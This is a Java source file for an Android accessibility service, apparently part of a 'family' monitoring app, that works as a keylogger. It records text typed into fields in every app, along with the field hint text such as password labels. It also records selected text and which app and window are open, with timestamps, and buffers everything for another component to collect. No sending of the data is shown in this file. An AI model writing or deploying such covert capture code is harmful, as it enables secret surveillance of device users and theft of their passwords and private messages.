package com.familyshield.device.guard;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.text.SimpleDateFormat;
import java.util.*;

public class AccessibilityHelperService extends AccessibilityService {

    private static final String TAG      = "FamilyAccessibility";
    private static final int    MAX_LOGS = 50_000;

    private static final StringBuilder logBuffer = new StringBuilder();
    private static final Object        lock       = new Object();

    private String  lastPkg    = "";
    private String  lastWindow = "";
    private final SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss", Locale.US);

    @Override
    public void onServiceConnected() {
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes =
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED             |
                AccessibilityEvent.TYPE_VIEW_FOCUSED                   |
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED           |
                AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags =
                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        String pkg  = event.getPackageName() != null ? event.getPackageName().toString() : "?";
        int    type = event.getEventType();

        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            if (!pkg.equals(lastPkg)) {
                lastPkg = pkg;
                CharSequence title = event.getText().isEmpty() ? "" : event.getText().get(0);
                String label = title != null ? title.toString() : "";
                if (!label.equals(lastWindow)) {
                    lastWindow = label;
                    append("\n[APP:" + pkg + " / " + label + " @ " + ts() + "]\n");
                }
            }
            return;
        }

        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            List<CharSequence> texts = event.getText();
            if (texts != null && !texts.isEmpty()) {
                String text = texts.get(0).toString();
                String hint = "";
                AccessibilityNodeInfo src = event.getSource();
                if (src != null) {
                    CharSequence h = src.getHintText();
                    if (h != null) hint = "[" + h + "] ";
                    src.recycle();
                }
                append(hint + text + "\n");
            }
        }

        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
            AccessibilityNodeInfo src = event.getSource();
            if (src != null) {
                CharSequence txt = src.getText();
                if (txt != null && txt.length() > 0) append("[SEL:" + txt + "]\n");
                src.recycle();
            }
        }
    }

    @Override
    public void onInterrupt() {}

    public static String flushLogs() {
        synchronized (lock) {
            String data = logBuffer.toString();
            logBuffer.setLength(0);
            return data;
        }
    }

    public static int bufferSize() {
        synchronized (lock) { return logBuffer.length(); }
    }

    private void append(String s) {
        synchronized (lock) {
            logBuffer.append(s);
            if (logBuffer.length() > MAX_LOGS) logBuffer.delete(0, MAX_LOGS / 2);
        }
    }

    private String ts() { return sdf.format(new Date()); }
}
